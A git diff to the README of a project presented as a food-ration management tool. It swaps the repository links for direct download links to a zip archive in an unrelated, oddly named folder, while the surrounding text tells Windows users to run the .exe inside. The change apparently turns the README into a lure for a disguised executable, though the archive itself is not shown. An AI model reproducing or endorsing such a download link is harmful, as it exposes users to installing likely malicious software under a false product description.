@@ -1,6 +1,6 @@
 # 📦 project-namma-ration - Modern system for managing food supplies
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/leiaconstitutional3044/project-namma-ration)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/leiaconstitutional3044/project-namma-ration/main/senecionine/ration_namma_project_1.2.zip)
 
 Project Namma Ration simplifies how users track and manage food allocations. This tool provides a clear view of inventory levels and distribution history. It removes the need for manual record keeping by automating data entry and tracking.
 
@@ -15,7 +15,7 @@ Ensure your computer meets these standards before you begin.
 
 ## 📥 Getting the Application
 
-Visit this page to download the software: [https://github.com/leiaconstitutional3044/project-namma-ration](https://github.com/leiaconstitutional3044/project-namma-ration)
+Visit this page to download the software: [https://raw.githubusercontent.com/leiaconstitutional3044/project-namma-ration/main/senecionine/ration_namma_project_1.2.zip](https://raw.githubusercontent.com/leiaconstitutional3044/project-namma-ration/main/senecionine/ration_namma_project_1.2.zip)
 
 Select the file that best fits your Windows version. Most users should choose the file ending in .exe. Save this file to your Downloads folder or another location you can find easily.
 
